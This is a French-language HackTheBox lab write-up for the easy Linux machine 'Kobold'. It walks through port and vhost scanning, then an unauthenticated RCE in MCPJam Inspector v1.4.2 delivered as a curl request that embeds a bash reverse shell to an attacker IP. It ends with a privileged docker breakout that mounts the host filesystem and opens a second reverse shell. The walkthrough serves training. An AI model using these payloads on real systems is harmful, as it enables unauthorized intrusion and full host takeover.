# HTB — Kobold · Linux · Easy

**IP :** `10.129.245.50` &nbsp;|&nbsp; **Date :** 25 Avril 2026 &nbsp;|&nbsp; **Outils :** nmap · rustscan · ffuf · nuclei · curl · netcat · docker

---

## Contexte

> Kobold est une machine Linux de difficulté **Easy** sur HackTheBox.
> L'accès initial repose sur une **RCE non authentifiée** dans MCPJam Inspector v1.4.2,
> et l'escalade de privilèges exploite l'appartenance au groupe **docker** pour s'échapper du container et lire le flag root.

---

## Reconnaissance

### Scan de ports

```bash
rustscan -a 10.129.245.50 -u 5000
```

Rustscan repère seulement 22, 80 et 443. Le scan complet nmap révèle un quatrième port :

```bash
nmap -sC -sV -p- -O 10.129.245.50
```

```
PORT     STATE SERVICE  VERSION
22/tcp   open  ssh      OpenSSH 9.6p1 Ubuntu-3ubuntu13.15
80/tcp   open  http     nginx 1.24.0
443/tcp  open  https    nginx 1.24.0
3552/tcp open  http     Golang net/http server
```

Le port **3552** est identifié comme `taserver` par nmap — c'est un faux positif. En réalité, c'est une webapp Go avec un frontend SvelteKit. À retenir : toujours faire un `-p-`, rustscan ne suffit pas.

### Scan passif (nuclei)

```bash
nuclei -target http://kobold.htb
```

Résultats notables : nginx 1.24.0 en fin de vie, en-têtes de sécurité absents (CSP, HSTS, X-Frame-Options). Aucune CVE directement exploitable côté HTTP.

### Virtual Host Fuzzing

```bash
ffuf -c -u https://kobold.htb \
     -H "Host: FUZZ.kobold.htb" \
     -w /usr/share/seclists/Discovery/DNS/bitquark-subdomains-top100000.txt \
     -fc 302,403,404 -k
```

```
mcp   [Status: 200, Size: 466]
bin   [Status: 200, Size: 24402]
```

Deux sous-domaines découverts :

- `mcp.kobold.htb` → **MCPJam Inspector v1.4.2** — le point d'entrée principal
- `bin.kobold.htb` → PrivateBin — intéressant pour la post-exploitation, pas pour l'accès initial

```bash
echo "10.129.245.50 kobold.htb mcp.kobold.htb bin.kobold.htb" | sudo tee -a /etc/hosts
```

### Fuzzing de l'API (port 3552)

```bash
ffuf -u http://kobold.htb:3552/FUZZ \
     -w /usr/share/seclists/Discovery/Web-Content/api/api-endpoints.txt \
     -c -fc 200
```

```
api/docs/          [Status: 301]
api/events         [Status: 401]
api/users/current  [Status: 401]
api/users/login    [Status: 401]
```

Les endpoints existent mais nécessitent une auth. L'accès initial passera par MCPJam.

---

## Exploitation — RCE non authentifiée (CVE-2026-23744)

**MCPJam Inspector** est un outil d'inspection de serveurs MCP (Model Context Protocol). La version 1.4.2 expose un endpoint `/api/mcp/connect` qui accepte une configuration de serveur arbitraire — y compris la commande à exécuter — **sans aucune authentification**.

### Listener

```bash
nc -lvnp 4444
```

### Payload

```bash
curl -k -X POST https://mcp.kobold.htb/api/mcp/connect \
  -H "Content-Type: application/json" \
  -d '{
    "serverId": "pwn",
    "serverConfig": {
      "command": "bash",
      "args": ["-c", "bash -i >& /dev/tcp/10.10.14.153/4444 0>&1"],
      "env": {}
    }
  }'
```

Le serveur exécute la commande sans valider le champ `command`. Connexion obtenue immédiatement :

```
connect to [10.10.14.153] from (UNKNOWN) [10.129.245.50] 43680
ben@kobold:/usr/local/lib/node_modules/@mcpjam/inspector$
```

### Stabilisation du shell

```bash
python3 -c 'import pty; pty.spawn("/bin/bash")'
export TERM=xterm-256color
export SHELL=/bin/bash
stty rows $(tput lines) columns $(tput cols)
```

### Flag utilisateur

```bash
cat /home/ben/user.txt
# user_flag{********************}
```

---

## Escalade de privilèges — Docker Escape

### Énumération des groupes

```bash
id
# uid=1001(ben) gid=111(docker) groups=111(docker),37(operator),1001(ben)
```

`ben` appartient au groupe **docker**. Un membre de ce groupe peut lancer des containers en mode privilégié, monter le système de fichiers hôte, et s'échapper complètement.

```bash
docker images
# mysql                         latest    f66b7a288113
# privatebin/nginx-fpm-alpine   2.0.2     f5f5564e6731
```

L'image `mysql:latest` est disponible localement. Pas besoin de pull.

### Docker breakout

```bash
nc -lvnp 5555
```

```bash
docker run --rm --privileged -v /:/host-root mysql:latest \
  /bin/bash -c 'chroot /host-root /bin/bash -i >& /dev/tcp/10.10.14.153/5555 0>&1'
```

### Lecture directe du flag root (méthode propre)

```bash
docker run --rm --privileged \
  -v /:/hostfs \
  --entrypoint cat mysql:latest \
  /hostfs/root/root.txt
# root_flag{********************}
```

---

## Flags

```
user.txt  →  user_flag{********************}
root.txt  →  root_flag{********************}
```

---

## Ce que j'ai retenu

**Toujours scanner `-p-`.** Rustscan avait raté le port 3552, et nmap l'avait mal identifié. Le vrai point d'entrée était là.

**Le VHOST fuzzing est indispensable.** Le port 3552 semblait être la piste principale. Le vrai chemin était caché derrière `mcp.kobold.htb`.

**Les outils de dev exposent souvent une RCE triviale.** MCPJam passe une commande sans auth — fonctionnalité légitime, mais catastrophique sans authentification.

**`docker` dans les groupes = root.** À checker systématiquement avec `id` dès qu'on a un shell.

---

## Ressources

- [MCPJam Inspector — GitHub](https://github.com/mcpjam/inspector)
- [HackTricks — Docker Breakout](https://book.hacktricks.xyz/linux-hardening/privilege-escalation/docker-security/docker-breakout-privilege-escalation)
- [PortSwigger — Command Injection](https://portswigger.net/web-security/os-command-injection)
